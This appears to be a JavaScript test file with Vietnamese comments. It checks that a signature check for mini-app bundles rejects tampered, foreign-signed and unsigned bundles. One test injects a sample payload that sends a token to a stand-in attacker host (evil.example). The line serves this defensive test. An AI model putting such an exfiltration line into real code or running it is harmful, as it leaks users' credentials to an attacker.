/**
 * TEST CHỮ KÝ BUNDLE.
 *
 * Chứng minh cơ chế bảo vệ quan trọng nhất của hướng B thực sự chặn được ba
 * kiểu tấn công, chứ không chỉ được mô tả trong README:
 *
 *   1. Bundle bị SỬA sau khi ký      → từ chối
 *   2. Bundle ký bằng khoá ĐỘI KHÁC  → từ chối
 *   3. Bundle KHÔNG ký               → từ chối
 *
 * Test chạy ở Node nên nó kiểm phần THUẬT TOÁN (JWT RS256 + SHA-256), giống hệt
 * thứ `backend/src/mini/signature.js` dùng lúc publish. Việc xác minh thật trên
 * máy người dùng diễn ra ở TẦNG NATIVE trong Re.Pack — phần đó phải kiểm tay,
 * xem mục "Kiểm tay" trong tài liệu thiết kế.
 */
import crypto from 'node:crypto';
import jwt from '../backend/node_modules/jsonwebtoken/index.js';
import { verifySignedBundle, splitSignedBundle, SignatureError } from '../backend/src/mini/signature.js';
import { createRunner } from './test-util.mjs';

const t = createRunner('Chữ ký bundle mini-app');

/** Tạo cặp khoá giống hệt tools/keys-gen.mjs. */
function keypair() {
  return crypto.generateKeyPairSync('rsa', {
    modulusLength: 2048,
    publicKeyEncoding: { type: 'spki', format: 'pem' },
    privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
  });
}

/** Ký y hệt CodeSigningPlugin của Re.Pack: nội dung + dấu mở + JWT, đệm 1280B. */
function sign(content, privateKey) {
  const hash = crypto.createHash('sha256').update(content).digest('hex');
  const token = jwt.sign({ hash }, privateKey, { algorithm: 'RS256' });
  const mark = Buffer.from('/* RCSSB */');
  return Buffer.concat(
    [content, mark, Buffer.from(token)],
    content.length + 1280,
  );
}

const teamA = keypair();
const teamB = keypair();
const content = Buffer.from('console.log("mini-app hợp lệ");');

/* 1. Đường hạnh phúc */
const good = sign(content, teamA.privateKey);
t.eq(
  'bundle ký đúng khoá → hợp lệ',
  verifySignedBundle(good, teamA.publicKey).hash,
  crypto.createHash('sha256').update(content).digest('hex'),
);
t.eq('tách được phần nội dung nguyên vẹn', splitSignedBundle(good).content.toString(), content.toString());

/* 2. Bundle bị sửa — đổi ĐÚNG MỘT byte */
const tampered = Buffer.from(good);
tampered[5] = tampered[5] ^ 0x01;
t.throws(
  'sửa 1 byte nội dung → từ chối',
  () => verifySignedBundle(tampered, teamA.publicKey),
  /không khớp chữ ký|đã bị sửa/,
);

/* 3. Chèn mã vào cuối phần nội dung, giữ nguyên chữ ký */
const injected = Buffer.concat([
  content,
  Buffer.from(';fetch("http://evil.example/"+globalThis.token)'),
]);
const injectedSigned = Buffer.concat(
  [injected, good.subarray(content.length)],
  injected.length + 1280,
);
t.throws(
  'chèn mã, giữ nguyên chữ ký cũ → từ chối',
  () => verifySignedBundle(injectedSigned, teamA.publicKey),
  /không khớp chữ ký|đã bị sửa/,
);

/* 4. Đội B ký nhưng khai là đội A — đúng kịch bản "chiếm được registry" */
const wrongTeam = sign(content, teamB.privateKey);
t.throws(
  'ký bằng khoá đội khác → từ chối',
  () => verifySignedBundle(wrongTeam, teamA.publicKey),
  /không hợp lệ với khoá/,
);

/* 5. Hoàn toàn không ký */
t.throws(
  'bundle chưa ký → từ chối',
  () => verifySignedBundle(content, teamA.publicKey),
  /chưa được ký/,
);

/* 6. Lỗi phải là SignatureError, không phải Error chung — route publish dựa vào
      điều này để trả 400 thay vì 500. */
let caught = null;
try { verifySignedBundle(content, teamA.publicKey); } catch (e) { caught = e; }
t.ok('lỗi là SignatureError', caught instanceof SignatureError);

t.done();
